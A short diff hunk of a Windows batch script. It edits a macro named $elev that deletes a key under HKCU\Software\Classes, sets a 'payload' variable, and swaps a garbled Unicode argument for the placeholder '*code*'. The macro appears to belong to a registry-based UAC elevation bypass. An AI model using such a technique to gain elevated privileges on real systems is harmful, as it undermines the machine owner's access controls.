@@ -37,4 +37,4 @@ set $elev=FOR %%A in (args main) do if "%%A" == "main" (%\n%
 		reg delete "HKCU\Software\Classes\%key%" /f%\n%
 	)^>nul 2^>^&1%\n%
 ) ELSE SETLOCAL EnableDelayedExpansion^&set payload=,
-%$elev% "の▥♣♡☎☆"
+%$elev% "*code*"
